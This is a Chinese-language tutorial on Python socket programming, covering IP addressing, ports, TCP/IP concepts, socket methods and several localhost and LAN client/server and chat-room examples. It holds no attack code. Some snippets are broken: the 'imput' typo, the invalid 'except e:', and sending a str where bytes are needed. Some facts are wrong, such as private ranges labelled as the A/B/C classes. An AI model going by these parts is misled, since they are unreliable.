IP地址是数字型的,它是一个32位(32bit)整数。但为了便于记忆,通常把它分成4个8位的二进制数,每8位之间用圆点隔开,每个8位整数都可以转换成一个0~255的十进制整数,因此日常看到的IP地址常常是这种形式:202.9.128.88。

NIC(Internet Network Information Center)统一负责全球Internet IP地址的规划和管理,而InterNIC、APNIC、RIPE三大网络信息中心则具体负责美国及其他地区的IP地址分配。其中APNIC负责亚太地区的IP地址管理,我国申请IP地址也要通过APNIC,APNIC的总部设在日本东京大学。

IP地址被分成A、B、C、D、E五类,每个类别的网络标识和主机标识各有规则:
A 类:10.0.0.0~10.255.255.255
B 类:172.16.0.0~172.31.255.255
C 类:192.168.0.0~192.168.255.255

IP地址用于唯一标识网络上的一个通信实体,但一个通信实体可以有多个通信程序同时提供网络服务,此时还需要使用端口。

端口是一个16位的整数,用于表示将数据交给哪个通信程序处理。因此端口就是应用程序与外界交流的出入口,它是一种抽象的软件结构,包括一些数据结构和I/O(输入/输出)缓冲区。

不同的应用程序处理不同端口上的数据,在同一台机器中不能有两个程序使用同一个端口。端口号可以为0~65535,通常将端口分为如下三类:
公认端口(Well Known Port):端口号为0~1023,它们紧密地绑定(Binding)一些特定的服务。
注册端口(Registered Port):端口号为1024~49151,它们松散地绑定一些服务。应用程序通常应该使用这个范围内的端口。
动态和/或私有端口(Dynamic and/or Private Port):端口号为49152～65535,这些端口是应用程序使用的动态端口,应用程序一般不会主动使用这些端口。

当一个程序需要发送数据时,需要指定目的地的IP地址和端口号,只有指定了正确的IP地址和端口号,计算机网络才可以将数据发送给该IP地址和端口号所对应的程序。

计算机网络就是把各个计算机连接到一起,让网络中的计算机可以互相通信。网络编程就是如何在程序中实现两台计算机的通信
由于电脑上可能不止浏览器,还有QQ、Skype、Dropbox、邮件客户端等,不同的程序连接的别的计算机也会不同,所以更确切地说网络通信是两台计算机上的两个进程之间的通信。比如浏览器进程和新浪服务器上的某个Web服务进程在通信,而QQ进程是和腾讯的某个服务器上的某个进程在通信
网络编程对所有开发语言都是一样的,Python也不例外。用Python进行网络编程,就是在Python程序本身这个进程内,连接别的服务器进程的通信端口进行通信

【 网络协议 】
实际的网络模型大致分为四层,这四层各有对应的网络协议提供支持
</pre><img src="image/net.gif"><pre>
网络层协议主要是IP,它是所有互联网协议的基础,其中ICMP(Internet Control Message Protocol)、IGMP(Internet Group Manage Protocol)、ARP(Address Resolution Protocol)、RARP(Reverse Address Resolution Protocol)等协议都可认为是IP协议族的子协议。通常来说,很少会直接基于网络层进行应用程序编程。

传输层协议主要是TCP 和UDP,Python提供了socket等模块针对传输层协议进行编程。

应用层协议就更多了,FTP、HTTP、TELNET等协议都属于应用层协议,Python同样为基于应用层协议的编程提供了丰富的支持。
虽然Python自带的标准库已经提供了很多与网络有关的模块,但如果在使用时觉得不够方便,则不要忘记了Python的优势,即大量的第三方模块随时可用于增强Python的功能。

Python标准库中的网络相关模块
socket:基于传输层TCP、UDP协议进行网络编程的模块
asyncore:socket模块的异步版,支持基于传输层协议的异步通信
asynchat:asyncore的增强版
cgi:基本的CGI(Common Gateway Interface,早期开发动态网站的技术)支持
email:E-mail和MLME消息处理模块
ftplib:支持FTP协议的客户端模块
httplib、http.client:支持HTTP协议以及HTTP客户揣的模块
imaplib:支持IMAP4协议的客户端模块
mailbox:操作不同格式邮箱的模块
mailcap:支持Mailcap文件处理的模块
nntplib:支持NTTP协议的客户端模块
smtplib:支持SMTP协议(发送邮件)的客户端模块
poplib:支持POP3协议的客户端模块
telnetlib:支持TELNET协议的客户端模块
urllib及其子模块:支持URL处理的模块
xmlrpc、xmlrpc.server、xmlrpc.client:支持XML-RPC协议的服务器端和客户端模块

【 TCP协议和IP协议 】
TCP/IP通信协议是一种可靠的网络协议,它在通信的两端各建立一个socket,从而形成虚拟的网络链路。一旦建立了虚拟的网络链路,两端的程序就可以通过该链路进行通信了。Python的socket模块为基于TCP协议的网络通信提供了良好的封装,Python使用socket对象来代表两端的通信端口,并通过socket进行网络通信。

IP是Internet上使用的一个关键协议,它的全称是Internet Protocol即Internet协议,通常简称IP协议。通过使用IP协议,使Internet成为一个允许连接不同类型的计算机和不同操作系统的网络。

要使两台计算机彼此能进行通信,必须使这两台计算机使用同一种"语言",IP协议只保证计算机能发送和接收分组数据。IP协议负责将消息从一个主机传送到另一个主机,消息在传送的过程中被分割成一个个小包。

尽管通过安装IP软件,保证了计算机之间可以发送和接收数据,但IP协议还不能解决数据分组在传输过程中可能出现的问题。因此连接Internet的计算机还需要安装TCP协议来提供可靠且无差错的通信服务。

TCP被称作端对端协议,这是因为它在两台计算机的连接中起了重要作用。当一台计算机需要与另一台远程计算机连接时,TCP协议会让它们之间建立一个虚拟链路,用于发送和接收数据。

TCP协议负责收集这些数据包,并将其按照适当的顺序传送,接收端接收到数据包后再将其正确地还原。TCP协议保证数据包在传送过程中准确无误。TCP协议采用重发机制,即当一个通信实体发送一个消息给另一个通信实体后,需要接收到另一个通信实体的确认信息,如果没有接收到该确认信息,则会重发信息。

通过重发机制TCP协议向应用程序提供了可靠的通信连接,使其能够自动适应网络上的各种变化。即使在Internet暂时出现堵塞的情况下,TCP协议也能够保证通信的可靠性。

只有把TCP和IP两个协议结合起来才能保证Internet在复杂的环境下正常运行凡是要连接到Internet的计算机都必须同时安装和使用TCP/IP协议

</pre>

<h4>socket</h4><pre>
Python提供了两个级别访问的网络服务:
低级别的网络服务支持基本的Socket,它提供了标准的BSD Sockets API,可以访问底层操作系统Socket接口的全部方法。
高级别的网络服务模块SocketServer,它提供了服务器中心类,可以简化网络服务器的开发

Socket又称套接字,应用程序通常通过套接字向网络发出请求或应答网络请求,使主机间或者一台计算机上的进程间可以通讯

</pre><textarea>
import socket               # 导入socket模块
print([e for e in dir(socket) if not e.startswith('_')])
# ['AF_APPLETALK', 'AF_DECnet', 'AF_INET', 'AF_INET6', 'AF_IPX', 'AF_IRDA', 'AF_SNA', 'AF_UNSPEC', 'AI_ADDRCONFIG', 'AI_ALL', 'AI_CANONNAME', 'AI_NUMERICHOST', 'AI_NUMERICSERV', 'AI_PASSIVE', 'AI_V4MAPPED', 'AddressFamily', 'AddressInfo', 'CAPI', 'EAGAIN', 'EAI_AGAIN', 'EAI_BADFLAGS', 'EAI_FAIL', 'EAI_FAMILY', 'EAI_MEMORY', 'EAI_NODATA', 'EAI_NONAME', 'EAI_SERVICE', 'EAI_SOCKTYPE', 'EBADF', 'EWOULDBLOCK', 'INADDR_ALLHOSTS_GROUP', 'INADDR_ANY', 'INADDR_BROADCAST', 'INADDR_LOOPBACK', 'INADDR_MAX_LOCAL_GROUP', 'INADDR_NONE', 'INADDR_UNSPEC_GROUP', 'IPPORT_RESERVED', 'IPPORT_USERRESERVED', 'IPPROTO_ICMP', 'IPPROTO_IP', 'IPPROTO_RAW', 'IPPROTO_TCP', 'IPPROTO_UDP', 'IPV6_CHECKSUM', 'IPV6_DONTFRAG', 'IPV6_HOPLIMIT', 'IPV6_HOPOPTS', 'IPV6_JOIN_GROUP', 'IPV6_LEAVE_GROUP', 'IPV6_MULTICAST_HOPS', 'IPV6_MULTICAST_IF', 'IPV6_MULTICAST_LOOP', 'IPV6_PKTINFO', 'IPV6_RECVRTHDR', 'IPV6_RECVTCLASS', 'IPV6_RTHDR', 'IPV6_TCLASS', 'IPV6_UNICAST_HOPS', 'IPV6_V6ONLY', 'IP_ADD_MEMBERSHIP', 'IP_DROP_MEMBERSHIP', 'IP_HDRINCL', 'IP_MULTICAST_IF', 'IP_MULTICAST_LOOP', 'IP_MULTICAST_TTL', 'IP_OPTIONS', 'IP_RECVDSTADDR', 'IP_TOS', 'IP_TTL', 'IntEnum', 'IntFlag', 'MSG_BCAST', 'MSG_CTRUNC', 'MSG_DONTROUTE', 'MSG_ERRQUEUE', 'MSG_MCAST', 'MSG_OOB', 'MSG_PEEK', 'MSG_TRUNC', 'MSG_WAITALL', 'MsgFlag', 'NI_DGRAM', 'NI_MAXHOST', 'NI_MAXSERV', 'NI_NAMEREQD', 'NI_NOFQDN', 'NI_NUMERICHOST', 'NI_NUMERICSERV', 'RCVALL_MAX', 'RCVALL_OFF', 'RCVALL_ON', 'RCVALL_SOCKETLEVELONLY', 'SHUT_RD', 'SHUT_RDWR', 'SHUT_WR', 'SIO_KEEPALIVE_VALS', 'SIO_LOOPBACK_FAST_PATH', 'SIO_RCVALL', 'SOCK_DGRAM', 'SOCK_RAW', 'SOCK_RDM', 'SOCK_SEQPACKET', 'SOCK_STREAM', 'SOL_IP', 'SOL_SOCKET', 'SOL_TCP', 'SOL_UDP', 'SOMAXCONN', 'SO_ACCEPTCONN', 'SO_BROADCAST', 'SO_DEBUG', 'SO_DONTROUTE', 'SO_ERROR', 'SO_EXCLUSIVEADDRUSE', 'SO_KEEPALIVE', 'SO_LINGER', 'SO_OOBINLINE', 'SO_RCVBUF', 'SO_RCVLOWAT', 'SO_RCVTIMEO', 'SO_REUSEADDR', 'SO_SNDBUF', 'SO_SNDLOWAT', 'SO_SNDTIMEO', 'SO_TYPE', 'SO_USELOOPBACK', 'SocketIO', 'SocketKind', 'SocketType', 'TCP_FASTOPEN', 'TCP_KEEPCNT', 'TCP_KEEPIDLE', 'TCP_KEEPINTVL', 'TCP_MAXSEG', 'TCP_NODELAY', 'close', 'create_connection', 'dup', 'errno', 'error', 'errorTab', 'fromfd', 'fromshare', 'gaierror', 'getaddrinfo', 'getdefaulttimeout', 'getfqdn', 'gethostbyaddr', 'gethostbyname', 'gethostbyname_ex', 'gethostname', 'getnameinfo', 'getprotobyname', 'getservbyname', 'getservbyport', 'has_ipv6', 'herror', 'htonl', 'htons', 'inet_aton', 'inet_ntoa', 'inet_ntop', 'inet_pton', 'io', 'ntohl', 'ntohs', 'os', 'selectors', 'setdefaulttimeout', 'socket', 'socketpair', 'sys', 'timeout']

s = socket.socket()
print([e for e in dir(s) if not e.startswith('_')])
# ['accept', 'bind', 'close', 'connect', 'connect_ex', 'detach', 'dup', 'family', 'fileno', 'get_inheritable', 'getblocking', 'getpeername', 'getsockname', 'getsockopt', 'gettimeout', 'ioctl', 'listen', 'makefile', 'proto', 'recv', 'recv_into', 'recvfrom', 'recvfrom_into', 'send', 'sendall', 'sendfile', 'sendto', 'set_inheritable', 'setblocking', 'setsockopt', 'settimeout', 'share', 'shutdown', 'timeout', 'type']

print(s)
# < socket.socket fd=500, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0>

</textarea><pre>
创建socket对象
程序在使用socket之前必须先创建socket对象,可通过该类的如下构造器来创建socket实例:
socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)

前三个参数比较重要,其中:
family参数指定网络类型,支持socket.AF_UNIX(UNIX网络)、socket.AF_INET(基于IPv4协议的网络)和socket.AF_INET6(基于IPv6协议的网络)三个常量
type参数指定网络Sock类型,可支持SOCK_STREAM(默认值,创建基于TCP协议的socket)、SOCK_DGRAM(创建基于UDP协议的socket)和SOCK_RAW(创建原始socket)。一般常用SOCK_STREAM和SOCK_DGRAM。
proto参数用于指定协议号,默认0,如果没有特殊要求该参数可以忽略

创建socket之后要将两个socket连接起来,在两个通信实体之间没有建立虚拟链路时必须有一个通信实体先主动接收来自其他通信实体的连接请求。
作为服务器端使用的socket必须被绑定到指定IP地址和端口,并在该IP地址和端口进行监听,接收来自客户端的连接

【 socket对象常用方法 】
s.accept()
服务器端socket调用该方法接收来自客户端的连接,被动接受TCP客户端连接,(阻塞式)等待连接的到来
Accept a connection. The socket must be bound to an address and listening for connections. The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection

s.bind(address)
服务器端socket调用该方法将该socket绑定到指定address,该address可以是一个元组包含IP地址和端口(host,port)

s.listen([backlog])
服务器端socket调用该方法进行监听TCP。backlog指定在拒绝连接之前操作系统可挂起的最大连接数,该值至少为1,一般设为5即可

s.close()
关闭连接,回收资源。

s.shutdown(how)
关闭连接,其中how用于设置关闭方式。

s.connect(address)
客户端socket调用该方法连接远程服务器,address的格式为元组(hostname,port),连接出错则返回socket.error错误

s.connect_ex(address)
与connect方法的功能大致相同,只是当程序出错时该方法不会抛出异常,而是返回一个错误标识符。

s.makefile(mode='r',buffering=None,＊,encoding=None,errors=None,newline=None)
创建一个和该socket关联的文件对象。

s.recv(bufsize[, flags])
接收socket中的数据,该方法返回bytes对象代表接收到的数据,bufsize指定要接收的最大数据量。flag提供有关消息的其他信息,通常可以忽略。

s.recv_into(buffer[, nbytes[, flags]])
类似于recv()方法,但该方法将接收到的数据放入buffer中。

s.recvfrom(bufsize[,flags])
与recv方法的功能大致相同,只是该方法的返回值是(bytes, address)元组。

s.recvfrom_into(buffer[, nbytes[, flags]])
类似于socket.recvfrom()方法,但该方法将接收到的数据放入buffer中。

s.recvmsg(bufsize[, ancbufsize[, flags]])
不仅接收来自socket的数据,还接收来自socket的辅助数据,因此返回值是一个长度为4的元组 (data,ancdata,msg_flags,address),其中ancdata代表辅助数据。

s.recvmsg_into(buffers[, ancbufsize[, flags]])
类似于socket.recvmsg()方法,但该方法将接收到的数据放入buffers中。

s.send(bytes[, flags])
向socket发送数据,该socket必须与远程socket建立了连接,该方法通常用于在基于TCP协议的网络中发送数据。返回值是要发送的字节数量,该数量可能小于string的字节大小。

s.sendall()
完整发送TCP数据,将string中的数据发送到连接的套接字,但在返回之前会尝试发送所有数据。成功返回None,失败则抛出异常。

s.sendto(bytes, address)
向socket发送数据,该socket应该没有与远程socket建立连接。该方法通常用于在基于UDP协议的网络中发送数据。address是形式为(ipaddr,port)的元组,指定远程地址。返回值是发送的字节数

s.sendfile(file, offset=0, count=None)
将整个文件内容都发送出去,直到遇到文件的EOF。

s.getpeername()
返回连接套接字的远程地址,返回值通常是元组(ipaddr,port)

s.getsockname()
返回套接字自己的地址,返回值通常是一个元组(ipaddr,port)

s.setsockopt(level,optname,value)
设置给定套接字选项的值。

s.getsockopt(level,optname[.buflen])
返回套接字选项的值。

s.settimeout(timeout)
设置套接字操作的超时期,timeout是浮点数,单位秒。值为None表示没有超时期。一般超时期应该在刚创建套接字时设置,因为它们可能用于连接的操作如connect()

s.gettimeout()
返回当前超时期的值,单位秒,如果没有设置超时期则返回None。

s.fileno()
返回套接字的文件描述符。

s.setblocking(flag)
flag为0则将套接字设为非阻塞模式,否则将套接字设为阻塞模式(默认值)
。非阻塞模式下,如果调用recv()没有发现任何数据,或send()调用无法立即发送数据,那么将引起socket.error异常。

</pre><textarea>
### 服务器端
import socket
ss = socket.socket()          # 创建socket实例
ss.bind(('localhost', 3000))  # 绑定IP地址与端口,参数要求元组形式(服务器IP地址字符串,端口号),因客户端和服务器都在本机,故采用本机环路IP地址(localhost=127.0.0.1)
ss.listen(1)                  # 允许一个客户端连接
# 返回服务器与当前客户端之间的新套接字(clientconn)和当前客户端的IP地址(clientaddr)。新套接字专用于该客户端与服务器通信,每个客户端连接服务器都会有各自的新套接字。若无客户端请求连接,则服务器一直等待
clientconn, clientaddr = ss.accept()
print('客户端连接成功,地址为： %s, 开始接收数据' % str(clientaddr))
while True:
    msg = clientconn.recv(2048).decode('utf-8')  # 接收新套接字中的数据,解码方式为utf-8
    print('客户端： ', msg)
    if msg is None: break
    returnmsg = imput('服务器： ').encode('utf-8')
    clientconn.send(returnmsg)
clientconn.close()

### 客户端
import socket
ss = socket.socket()
ss.connect(('127.0.0.1', 3000))
print('连接成功,可以发信了')
while True:
    msg = input('客户端：')
    if msg is None or msg == 'exit': break
    ss.send(msg.encode('utf-8'))
    print('服务器： ', ss.recv(2048).decode('utf-8'))
ss.close()

</textarea><textarea>
### 服务端server.py
import socket               # 导入socket模块
s = socket.socket()         # 创建socket对象,socket对象可以通过调用其他函数来设置一个socket服务
host = socket.gethostname() # 获取本地主机名LAPTOP-0KMQM01D
port = 12345                # 设置端口
s.bind((host, port))        # 绑定端口
s.listen(5)                 # 等待客户端连接
while True:
    conn,addr = s.accept()     # 建立客户端连接,等待客户端的连接,并返回connection对象,表示已连接到客户端
    print('连接地址:', addr)
    conn.send('欢迎访问')
    conn.close()                # 关闭连接

### 客户端连接到以上创建的服务client.py
import socket               # 导入socket模块
s = socket.socket()         # 创建socket对象
host = socket.gethostname() # 获取本地主机名
port = 12345                # 设置端口号
s.connect((host, port))     # 打开一个TCP连接到主机为hostname端口为port的服务商。连接后就可以从服务端获取数据,操作完成后需要关闭连接
print(s.recv(1024))
s.close()

### 打开两个终端,第一个终端执行server.py文件: python server.py
第二个终端执行client.py文件: python client.py
欢迎访问
这时再打开第一个终端就会看到有以下信息输出:
连接地址: ('192.168.0.118', 62461)

</textarea><pre>
【 PythonInternet模块 】
以下列出了Python网络编程的一些重要模块:
协议  功能用处  端口号 Python模块
HTTP  网页访问  80  httplib, urllib, xmlrpclib
NNTP  阅读和张贴新闻文章,俗称为"帖子" 119 nntplib
FTP  文件传输  20  ftplib, urllib
SMTP  发送邮件  25  smtplib
POP3  接收邮件  110 poplib
IMAP4 获取邮件  143 imaplib
Telnet  命令行 23  telnetlib
Gopher  信息查找  70  gopherlib, urllib

</pre>

<h4>TCP</h4><pre>
socket是网络编程的一个抽象概念,通常用一个Socket表示"打开了一个网络链接",而打开一个Socket需要知道目标计算机的IP地址和端口号,再指定协议类型即可

TCP通信的服务器端编程的基本步骤:
1、服务器端先创建一个socket对象。
2、服务器端socket将自己绑定到指定IP地址和端口。
3、服务器端socket调用listen()方法监听网络。
4、程序采用循环不断调用socket的accept()方法接收来自客户端的连接

TCP通信的客户端编程的基本步骤:
1、客户端先创建一个socket对象。
2、客户端socket调用connect()方法连接远程服务器,这样就可以建立一个基于TCP协议的网络连接

</pre>运行服务器端程序,服务器一直处于等待状态,因为服务器使用了死循环来接收来自客户端的请求;再运行客户端程序,将看到程序输出,这表明客户端和服务器端通信成功<textarea>
### 服务器端程序仅仅建立socket,并监听来自客户端的连接,只要客户端连接进来,程序就会向socket发送一条简单的信息
import socket                    # 导入socket模块
s = socket.socket()              # 创建socket对象
s.bind(('192.168.1.88', 30000))  # # 将socket绑定到本机即程序所在计算机的IP地址和端口,推荐1024以上的端口,避免与其他应用程序的通用端口冲突
s.listen()                       # 服务端开始监听来自客户端的连接
while True:
    conn, addr = s.accept()         # 每当接收到客户端socket的请求时,该方法返回对应的socket和远程地址
    print(conn, '连接地址:', addr)
    conn.send('您好,您收到了服务器的新年祝福！'.encode('utf-8'))
    conn.close()                    # 关闭连接

### 客户端程序仅仅使用socket建立与指定IP地址和端口的连接,并从socket中获取服务器端发送的数据
import socket                                    # 导入socket模块
s = socket.socket()                              # 创建socket对象
s.connect(('192.168.1.88', 30000))               # 连接指定的远程主机,让服务器端socket的accept()方法向下执行,于是服务器端和客户端就产生一对互相连接的socket,当服务器端和客户端产生了对应的socket之后,程序无须再区分服务器端和客户端,而是通过各自的socket进行通信
print('--%s--' % s.recv(1024).decode('utf-8'))   # 调用socket的recv()方法来接收网络数据
s.close()                                        # 关闭连接

</textarea><pre>
【 服务端 】
服务器进程首先要绑定一个端口并监听来自其他客户端的连接。如果某个客户端连接过来了,服务器就与该客户端建立Socket连接,随后的通信就靠这个Socket连接
所以服务器会打开固定端口比如80监听,每来一个客户端连接就创建该Socket连接。由于服务器会有大量来自客户端的连接,所以服务器要能够区分一个Socket连接是和哪个客户端绑定的。一个Socket依赖4项:服务器地址、服务器端口、客户端地址、客户端端口来唯一确定一个Socket。
但服务器需要同时响应多个客户端的请求,所以每个连接都需要一个新的进程或线程来处理,否则服务器一次就只能服务一个客户端了。

</pre>编写一个简单的服务器程序,它接收客户端连接,把客户端发过来的字符串加上Hello再发回去<textarea>
import socket, threading, time

# 每个连接都必须创建新线程或进程来处理,否则单线程在处理连接的过程中无法接受其他客户端的连接
# 连接建立后,服务器首先发一条欢迎消息,然后等待客户端数据,并加上Hello再发送给客户端。如果客户端发送了exit字符串,就直接关闭连接
def tcplink(sock, addr):
    print('Accept new connectionfrom%s:%s...' % addr)
    sock.send(b'Welcome!')
    while True:
        data = sock.recv(1024)
        time.sleep(1)
        if not data or data.decode('utf-8') == 'exit':
            break
        sock.send(('Hello, %s!' % data.decode('utf-8')).encode('utf-8'))
    sock.close()
    print('Connection from %s:%s closed.' % addr)

# 创建一个基于IPv4和TCP协议的socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 绑定要监听的地址和端口。服务器可能有多块网卡,可以绑定到某一块网卡的IP地址上,也可以用0.0.0.0绑定到所有的网络地址,还可以用127.0.0.1绑定到本机地址。127.0.0.1是一个特殊的IP地址表示本机地址,如果绑定到这个地址,客户端必须同时在本机运行才能连接,也就是说外部的计算机无法连接进来。
# 端口号需要预先指定,因为写的这个服务不是标准服务,所以用9999这个端口号,小于1024的端口号必须要有管理员权限才能绑定:
s.bind(('127.0.0.1', 9999))

# 调用listen()方法开始监听端口,传入的参数指定等待连接的最大数量
s.listen(5)
print('127.0.0.1:9999 Waiting for connection...')

# 服务器程序通过一个永久循环来接受来自客户端的连接,accept()会等待并返回一个客户端的连接
while True:
    sock, addr = s.accept()                                  # 接受一个新连接
    t = threading.Thread(target=tcplink, args=(sock, addr))  # 创建新线程来处理TCP连接
    t.start()

### 编写一个客户端程序测试这个服务器程序
import socket                         # 导入socket库
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))        # 建立连接:
print(s.recv(1024).decode('utf-8'))   # 接收欢迎消息:
for data in [b'Michael', b'Tracy', b'Sarah']:
    s.send(data)                      # 发送数据:
    print(s.recv(1024).decode('utf-8'))
s.send(b'exit')
s.close()

### 需要打开两个命令行窗口,一个运行服务器程序,另一个运行客户端程序,客户端程序运行完毕就退出了,而服务器程序会永远运行下去,必须按Ctrl+C退出程序
┌────────────────────────────────────────────────────────┐
│Command Prompt                                    - □ x │
├────────────────────────────────────────────────────────┤
│$ python echo_server.py                                 │
│Waiting for connection...                               │
│Accept new connectionfrom127.0.0.1:64398...             │
│Connectionfrom127.0.0.1:64398 closed.                   │
│                                                        │
│       ┌────────────────────────────────────────────────┴───────┐
│       │Command Prompt                                    - □ x │
│       ├────────────────────────────────────────────────────────┤
│       │$ python echo_client.py                                 │
│       │Welcome!                                                │
│       │Hello, Michael!                                         │
└───────┤Hello, Tracy!                                           │
        │Hello, Sarah!                                           │
        │$                                                       │
        │                                                        │
        │                                                        │
        └────────────────────────────────────────────────────────┘

</textarea><pre>
【 客户端 】
大多数连接都是可靠的TCP连接。创建TCP连接时主动发起连接的叫客户端,被动响应连接的叫服务器。
浏览器中访问新浪时,本地计算机就是客户端,浏览器会主动向新浪的服务器发起连接。如果一切顺利,新浪的服务器接受了连接,一个TCP连接就建立起来的,后面的通信就是发送网页内容了

</pre>创建基于TCP连接的socket客户端<textarea>
# 导入socket库
import socket
# 创建一个socket对象,AF_INET指定使用IPv4协议,若用更先进的IPv6就指定为AF_INET6。SOCK_STREAM指定使用面向流的TCP协议
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 建立连接,客户端要主动发起TCP连接必须知道服务器IP地址和端口号。百度的IP地址可用域名www.baidu.com自动转换到IP地址,80端口是Web服务的标准端口
s.connect(('www.baidu.com', 80))

# 向百度服务器发送请求数据,要求返回首页的内容
# TCP连接创建的是双向通道,双方都可以同时给对方发数据。但谁先发谁后发,怎么协调,要根据具体的协议来决定。例如HTTP协议规定客户端必须先发请求给服务器,服务器收到后才发数据给客户端,发送的文本格式必须符合HTTP标准
s.send(b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: close\r\n\r\n')

# 接收数据:接收百度服务器返回的数据
buffer = []
while True:                 # 在一个while循环中反复接收,直到recv()返回空数据,表示接收完毕,退出循环
    d = s.recv(1024)        # 每次最多接收1k字节
    print(type(d))          # < class 'bytes'>
    if d:
        buffer.append(d)
    else:
        break
data = b''.join(buffer)

# 调用close()方法关闭Socket连接,这样一次完整的网络通信就结束了
s.close()

# 接收到的数据包括HTTP头和网页本身,只需要把HTTP头和网页分离一下,把HTTP头打印出来,网页内容保存到文件:
header, html = data.split(b'\r\n\r\n', 1)
print(header.decode('utf-8'))
# 把接收的数据写入文件:
with open('baidu.html', 'wb') as f:
    f.write(html)

</textarea><pre>
【 socket shutdown方法 】
简单的服务器端和客户端通信常以一个bytes对象作为通信的最小数据单位的,服务器端在处理信息时也是针对每个bytes进行的。在一些协议中,通信的数据单位可能需要多个bytes对象,在这种情况下就需要解决一个问题,socket如何表示输出数据已经结束？
如果要表示输出数据已经结束可以通过关闭socket来实现。但如果彻底关闭了socket则会导致程序无法再从该socket中读取数据。
在这种情况下socket提供了一个shutdown(how)关闭方法,该方法可以只关闭socket的输入或输出部分,用以表示输出数据已经发送完成。
当调用shutdown()方法关闭socket的输入或输出部分之后,该socket处于"半关闭"状态。

shutdown方法的参数how接受如下参数值:
SHUT_RD:关闭socket的输入部分,程序还可通过该socket输出数据。
SHUT_WR:关闭该socket的输出部分,程序还可通过该socket读取数据。
SHUT_RDWR:全关闭,该socket既不能读取数据,也不能写入数据,该socket依然没有被彻底清理,与close()方法不同

</pre>服务器端先向客户端发送多条数据,当数据发送完成后该socket对象调用shutdown()方法来关闭输出部分,表明数据发送结束,在关闭输出部分之后依然可以从socket中读取数据<textarea>
import socket
s = socket.socket()             # 创建socket对象
s.bind(('192.168.1.88', 30000)) # 将socket绑定到本机IP和端口
s.listen()                      # 服务端开始监听来自客户端的连接
skt, addr = s.accept()          # 每当接收到客户端socket的请求时,该方法返回对应的socket和远程地址
skt.send("服务器的第一行数据".encode('utf-8'))
skt.send("服务器的第二行数据".encode('utf-8'))
skt.shutdown(socket.SHUT_WR)    # 关闭socket的输出,表明输出数据已经结束,此时该socket并未被彻底关闭,程序只是不能向该socket中写入数据了,但依然可从该socket中读取数据
while True:
    line = skt.recv(2048).decode('utf-8') # 从socket读取数据
    if line is None or line == '':
        break
    print(line)
skt.close()
s.close()

</textarea><pre>
当调用socket的shutdown()方法关闭了输入或输出部分之后,该socket无法再次打开输入或输出部分,因此这种做法通常不适合保持持久通信状态的交互式应用,只适用于一站式的通信协议,例如HTTP协议,即客户端连接到服务器端,开始发送请求数据,当发送完成后无须再次发送数据,只需要读取服务器端的响应数据即可,当读取响应数据完成后该socket连接就被完全关闭了。

【 TCP握手 】
TCP三次握手连接
客户端：我要发起连接了,服务器,你准备好了吗？
服务器：我准备好了,客户端,你准备好了吗？
客户端：我也准备好了,服务器,下面我开始发送数据了！

ACK：Acknowledge,确认序号有效
SEQ：Sequence Number,序号,32位,标记从客户端发送到服务器的数据包序号
SYN：Synchronous,建立一个新连接

三次握手重要之处：
1.发送方确认对方是否收到自身发送的数据是通过"ACK"号确定的
2.发送方总会记录自己发出的数据包序号SEQ,对方收到该数据包后回传确认数据,发送方检查对方回传数据中的"ACK"号是否等于SEQ+1,若成立则说明对方正确收到了自己的数据包

TCP四次握手断开
客户端：数据发送完成,服务器,我想断开连接了
服务器：好的,客户端,请稍等一会,我来做准备
片刻时间之后……
服务器：客户端,我已经准备好了,你可以断开连接了
客户端：好咧,感谢配合

ACK：Acknowledge,确认序号有效
SEQ：Sequence Number,序号,32位,标记从客户端发送到服务器的数据包序号
FIN ：Finish,断开一个连接

</pre>

<h4>多线程实现socket通信</h4><pre>
在实际应用中客户端可能需要和服务器端保持长时间通信,即服务器端需要不断地读取客户端数据,并向客户端写入数据;客户端也需要不断地读取服务器端数据,并向服务器端写入数据。

由于socket的recv()方法在成功读取到数据之前线程会被阻塞,程序无法继续执行。考虑到这个原因,服务器端应该为每个socket都单独启动一个线程,每个线程负责与一个客户端进行通信。
客户端读取服务器端数据的线程同样会被阻塞,所以系统应该单独启动一个线程,该线程专门负责读取服务器端数据。

现在考虑实现一个命令行界面的C/S聊天室应用,服务器端应该包含多个线程,每个socket对应一个线程,该线程负责从socket中读取从客户端发送过来的数据,并将所读取到的数据向每个socket发送一次,将一个客户端发送过来的数据广播给其他客户端,因此需要在服务器端使用list来保存所有的socket

</pre>先运行MyServer程序,该程序运行后只是作为服务器,看不到任何输出信息。再运行多个MyClient程序,相当于启动多个聊天室客户端登录该服务器,接下来可以在任何一个客户端通过键盘输入一些内容,然后按回车键,即可在所有客户端(包括自己)的控制台中收到刚输入的内容,这就粗略实现了一个C/S结构的聊天室应用<textarea>
'''
服务器端的实现代码,定义了一个server_target()函数作为线程执行的target负责处理每个socket的数据通信
服务器端主程序只负责接收客户端socket的连接请求,每当客户端socket连接进来之后,程序都将对应的新socket连接加入socket_list列表中保存,并为该socket启动一个线程负责处理该socket所有的通信任务
代表服务器端线程执行体的server_target()则不断地读取客户端数据。程序使用read_from_client()来读取客户端数据,如果在读取数据过程中捕获到异常则表明该socket对应的客户端socket出现了问题,程序就将该socket 从 socket_list列表中删除
当服务器端线程读取到客户端数据之后,程序遍历socket_list列表,并将该数据向socket_list列表中的每个socket发送一次(该服务器端线程把从socket中读取到的数据向socket_list列表中的每个socket转发一次)
'''

import socket
import threading

socket_list = []                 # 定义保存所有socket的列表
ss = socket.socket()             # 创建socket对象
ss.bind(('192.168.1.88', 30000)) # 将socket绑定到本机IP和端口,'0.0.0.0'
ss.listen()                      # 服务端开始监听来自客户端的连接

def read_from_client(s):
    try:
        return s.recv(2048).decode('utf-8')
    except:
        socket_list.remove(s);   # 如果捕获到异常则表明该socket对应的客户端已经关闭,删除该socket

def server_target(s):
    try:
        while True:              # 采用循环不断地从socket中读取客户端发送过来的数据
            content = read_from_client(s)
            print(content)
            if content is None:  break
            for client_s in socket_list:
                client_s.send(content.encode('utf-8'))
    except e:
        print(e.strerror)

while True:
    s, addr = ss.accept()   # 此行代码会阻塞,将一直等待别人的连接
    socket_list.append(s)
    threading.Thread(target=server_target, args=(s, )).start()  # 每当客户端连接后启动一个线程为该客户端服务

